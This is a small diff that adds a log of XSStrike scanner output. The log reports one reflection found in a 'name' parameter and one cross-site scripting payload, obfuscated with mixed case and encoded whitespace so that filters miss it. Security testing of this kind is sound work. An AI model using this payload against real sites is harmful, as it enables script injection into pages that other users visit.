@@ -1,0 +1,12 @@
+	XSStrike v3.1.5
+
+[+] WAF Status: Offline
+[!] Testing parameter: name
+[!] Reflections found: 1
+[~] Analysing reflections
+[~] Generating payloads
+[!] Payloads generated: 3072
+------------------------------------------------------------
+[+] Payload: <HtMl%09onPoiNTeRenTER%0d=%0d[8].find(confirm)>
+[!] Efficiency: 92
+[!] Confidence: 10
